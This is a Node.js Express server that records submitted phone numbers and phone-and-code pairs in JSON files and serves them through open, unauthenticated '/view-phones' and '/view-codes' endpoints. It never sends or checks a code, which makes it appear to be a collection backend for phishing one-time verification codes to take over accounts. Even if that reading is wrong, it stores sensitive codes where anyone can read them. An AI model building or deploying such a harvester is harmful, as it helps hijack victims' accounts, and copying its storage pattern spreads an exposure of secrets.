const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Paths for JSON files
const phonesJsonPath = path.join(__dirname, 'phones.json');
const codesJsonPath = path.join(__dirname, 'codes.json');

// Middleware to parse JSON
app.use(cors());
app.use(express.json());

// Ensure JSON files exist
function ensureJsonFile(filePath) {
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify([]));
  }
}
ensureJsonFile(phonesJsonPath);
ensureJsonFile(codesJsonPath);

// Root route
app.get('/', (req, res) => {
  res.send('✅ Backend is running!');
});

// Save phone number to phones.json
app.post('/save-phone', (req, res) => {
  const { phone } = req.body;
  if (!phone) {
    return res.status(400).json({ error: 'No phone number provided' });
  }

  fs.readFile(phonesJsonPath, 'utf8', (err, data) => {
    if (err) return res.status(500).json({ error: 'Failed to read phones file' });

    let phones;
    try {
      phones = JSON.parse(data);
    } catch (e) {
      phones = [];
    }

    phones.push({ phone, timestamp: new Date().toISOString() });
    fs.writeFile(phonesJsonPath, JSON.stringify(phones, null, 2), (err) => {
      if (err) {
        console.error('Error saving phone:', err);
        return res.status(500).json({ error: 'Failed to save phone' });
      }
      res.json({ success: true, message: 'Phone saved successfully' });
    });
  });
});

// Save phone + code to codes.json
app.post('/save-code', (req, res) => {
  const { phone, code } = req.body;
  if (!phone || !code) {
    return res.status(400).json({ error: 'Phone and code are required' });
  }

  fs.readFile(codesJsonPath, 'utf8', (err, data) => {
    if (err) return res.status(500).json({ error: 'Failed to read codes file' });

    let codes;
    try {
      codes = JSON.parse(data);
    } catch (e) {
      codes = [];
    }

    codes.push({ phone, code, timestamp: new Date().toISOString() });
    fs.writeFile(codesJsonPath, JSON.stringify(codes, null, 2), (err) => {
      if (err) {
        console.error('Error saving code:', err);
        return res.status(500).json({ error: 'Failed to save code' });
      }
      res.json({ success: true, message: 'Code saved successfully' });
    });
  });
});

// View saved phones
app.get('/view-phones', (req, res) => {
  fs.readFile(phonesJsonPath, 'utf8', (err, data) => {
    if (err) {
      console.error('Error reading phones.json:', err);
      return res.status(500).send('Error reading phones file');
    }
    res.type('json').send(data);
  });
});

// View saved codes
app.get('/view-codes', (req, res) => {
  fs.readFile(codesJsonPath, 'utf8', (err, data) => {
    if (err) {
      console.error('Error reading codes.json:', err);
      return res.status(500).send('Error reading codes file');
    }
    res.type('json').send(data);
  });
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running at http://localhost:${PORT}`);
});
